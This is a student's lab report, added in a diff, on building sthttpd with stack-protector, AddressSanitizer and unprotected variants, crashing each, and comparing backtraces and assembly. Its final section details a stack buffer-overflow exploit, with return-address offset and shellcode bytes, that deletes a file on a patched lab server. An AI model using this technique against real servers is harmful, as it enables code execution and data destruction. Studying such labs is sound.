@@ -1,0 +1,146 @@
+Satvik Anand
+404823011
+
+The first step was to download sthttpd and extract it. For this I used wget and then I changed the path using the commands 
+PATH=/usr/local/cs/bin:$PATH
+export PATH
+
+Then I had to build sthttpd. I used the command 
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib" to configure the file.
+
+I continued by doing the options SP, AS AND NO by using the commands
+ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong' followed by mv src/thttpd src/thttpd-sp
+ make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address' followed by mv src/thttpd src/thttpd-as
+ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'followed by mv src/thttpd src/thttpd-no
+
+I had to check whether the web servers were working correctly. So I first created a test file called foo.txt which contained the text ‘Everything works correctly.’ in my sthttpd directory and then used the commands:
+
+src/thttpd-sp -p 12772 -D and curl http://localhost:12772/foo.txt in a new window.
+src/thttpd-as -p 12773 -D and curl http://localhost:12773/foo.txt in a new window.
+src/thttpd-no -p 12774 -D and curl http://localhost:12774/foo.txt in a new window.
+
+All these commands outputted ‘Everything works correctly.’ as they were supposed to, which shows that my web servers work in the normal case.
+
+The next step was to make the SP variant crash.
+
+To do this I created a file called config.txt which contains a string that makes the program crash when used as an argument for thttpd. 
+
+The program crashed when I ran it and using bt in gdb I got the following backtrace.
+#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404edd in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x66686a736b6c6166 in ?? ()
+#8  0x68646a73616b6c64 in ?? ()
+#9  0x647368616a6b6c66 in ?? ()
+#10 0x6468736a616b6c66 in ?? ()
+#11 0x00007fff00002c66 in ?? ()
+#12 0x00007fffffffe1e0 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+From this backtrace we can see that read_config fails when it calls __stack_chk_fail ()
+So I called the assembly dump at __stack_chk_fail () by using the command disas 0x00007ffff76e8d50.
+From the assembly dump we can see that the canary values are compared at the instruction:
+0x0000000000404e15 <+1125>:	xor    %fs:0x28,%rax
+And this is followed by a jump, which to stack_chk_fail
+0x0000000000404e1e <+1134>:	jne    0x404ed8 <read_config+1320>
+
+At the jump address we can see:
+0x0000000000404ed8 <+1320>:	callq  0x402480 <__stack_chk_fail@plt> 
+Stack check fail is called at this address. 
+
+I then had to do the same thing for the as variant. 
+
+I found that it had a buffer overflow error and when I ran the backtrace it gave me the following:
+#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffaf90, pc=4464100, max_depth=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+#3  0x0000000000419d7f in GetStackTraceWithPcBpAndContext (fast=false, 
+    context=0x0, bp=140737488342240, pc=4464100, max_depth=256, 
+    stack=0x7fffffffaf90)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+#4  __asan::ErrorGeneric::Print (
+    this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+#5  0x00000000004ccae8 in Print (
+    this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+#6  ~ScopedInErrorReport (this=0x7fffffffb807, __in_chrg=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342240, 
+    sp=sp@entry=140737488340112, addr=addr@entry=140737488342404, 
+    is_write=is_write@entry=false, access_size=access_size@entry=354, exp=0, 
+    fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, 
+---Type <return> to continue, or q <return> to quit---
+    c=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+#9  0x00000000004feb58 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+#10 0x6664736166647361 in ?? ()
+
+So I set wanted to look at the assembly dump at 0x00000000004feb58 and from that I noticed that the command callq  0x442050 <__interceptor_strchr(char const*, int)> was causing problems because it tried to check the shadow memory and the test failed. Thus the program aborted.
+
+For no, I did the same process and after looking at the assembly dump at read_config we see the line 0x0000000000404c8c <+1116> retq. As we can see, compared to the previous versions, this one does not check for buffer overflow. Since we are using the -zexecstack flag, we are able to execute any program on the stack. However, since we received SIGSEGV, we can see that we tried to execute something that was not executable, which has to be outside the scope of the stack.
+
+The next step was to create the .s files that we needed. I did this using the commands: 
+make clean
+make CFLAGS='-g3 -S -O2 -fno-inline -fstack-protector-strong'
+
+make clean
+make CFLAGS='-g3 -S -O2 -fno-inline -static-libasan -fsanitize=address'
+
+make clean
+make CFLAGS='-g3 -S -O2 -fno-inline -fno-stack-protector -zexecstack'
+
+-fstack-protector-strong uses canaries to check for buffer overflow whereas -fsanitize=address uses shadow memory to check for buffer overflows. If we just look at handle_read, we can see than no and sp are almost the same thing because sp has only one check for the canary and the end of read_config. Thus within handle_read sp has no special checks in the machine code, which is probably why it is identical to no. as, on the other hand, has many more checks based around shadow memory all throughout handle_read. as maps shadown memory around the buffer and constantly checks whether the shadow memory is being accessed; if it is being access, it causes the program to crash. These checks are part of handle_read, which is why as is not only much longer in terms of machine code, but also significantly different when compared to no and sp. 
+
+Exploit:
+I knew that we could create our exploit because we applied the patch which changed the buffer to 100 characters from 10000 characters. Our fgets looks at 1000 bytes worth of memory. What I did to find the initial address was gdb src/thttpd-no and then set the break point at read_confid and go until I got to fgets. Once there I ran p &line. Using that I got the address of the base of the buffer. What I did then was to continue to run this until the end of read_config and look at rsp at that point. I saw then that the difference between the base of the buffer adn the return address was 152 bytes. Using this information I made my config.txt file so that it had 152 characters with the port option in the beginning. With this in mind, I created a new text file 'target.txt/0' (which I was able to convert to hex using xxd "target.txt") right after the return address. However, in the return address itself, I put the return address + 8 + 11 *because of the remaining byte and the bytes from the c-string target.txt with a null terminness). I then had the instruction to move the address of the start of the c-string into %rdi, which is the first argument that will be passed into the OS syscall unlink function. Unlink is the OS function from syscall that deletes a file. I then disassembled the byte code and it gave me the following lines. 
+  0:   48 bf a0 cf ff ff ff 	movabs $0x7fffffffcfa0,%rdi
+  7:  7f 00 00 
+
+We then in gdb ran the command:
+(gdb) disas /r unlink
+   0x00007ffff76c40b0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax
+   0x00007ffff76c40b5 <+5>:	0f 05 syscall 
+   0x00007ffff76c40b7 <+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
+   0x00007ffff76c40bd <+13>:	73 01 jae    0x7ffff76c40c0 <unlink+16>
+   0x00007ffff76c40bf <+15>:	c3 retq   
+   0x00007ffff76c40c0 <+16>:	48 8b 0d 99 0d 2d 00	mov    0x2d0d99(%rip),%rcx        # 0x7ffff7994e60
+   0x00007ffff76c40c7 <+23>:	f7 d8 neg    %eax
+   0x00007ffff76c40c9 <+25>:	64 89 01     mov    %eax,%fs:(%rcx)
+   0x00007ffff76c40cc <+28>:	48 83 c8 ff  or     $0xffffffffffffffff,%rax
+   0x00007ffff76c40d0 <+32>:	c3 retq
+
+From this we can see the first two lines, which move 87 into rax (the call to unlink) and then calling syscall which will in turn look into rax and call unlink because of 87. I then put all of this hex code into a file called exploit.txt. I then did 
+gdb src/thttpd-no
+(gdb) run -p 12774 -D -C exploit.txt
+This would thus call a segmentation fault after read_config and our exploit was finished. I checked that the file target.txt was not in the working directory. I just included my exploit.txt with my submission. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
